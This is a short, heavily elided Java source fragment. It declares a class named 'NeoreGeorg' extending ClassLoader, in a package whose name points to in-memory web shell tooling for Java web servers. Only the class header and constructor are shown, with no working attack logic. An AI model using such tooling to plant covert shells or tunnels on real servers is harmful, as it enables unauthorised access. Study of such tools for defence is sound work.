package com.reajason.javaweb.memshell.shelltool.neoreg;
 ...
 * key: key
 */
public class NeoreGeorg extends ClassLoader {
    ...
    public NeoreGeorg(ClassLoader z) {
        super(z);
    }
